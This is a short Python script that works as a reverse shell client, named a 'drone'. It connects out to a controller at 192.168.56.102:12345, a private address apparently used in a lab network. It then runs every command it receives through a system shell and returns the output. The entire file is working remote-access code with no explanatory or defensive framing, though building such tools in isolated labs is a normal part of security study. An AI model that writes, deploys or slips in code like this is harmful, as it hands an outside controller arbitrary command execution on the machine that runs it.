import socket
import subprocess

SERVER_HOST = "192.168.56.102"
SERVER_PORT = 12345

drone_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
drone_socket.connect((SERVER_HOST, SERVER_PORT))
print(f"Connected to {SERVER_HOST}:{SERVER_PORT}")

while True:
	command = drone_socket.recv(1024).decode("UTF-8")
	if not command:
		break
	print("Command received:", command)
	try:
		completed_process = subprocess.run(command, shell=True, capture_output=True, text=True)
		if (completed_process.stdout):
			report = completed_process.stdout
		else:
			report = completed_process.stderr
		print(report)
		drone_socket.send(report.encode("UTF-8"))
	except Exception as e:
		drone_socket.send("Error executing command.".encode("UTF-8"))
drone_socket.close()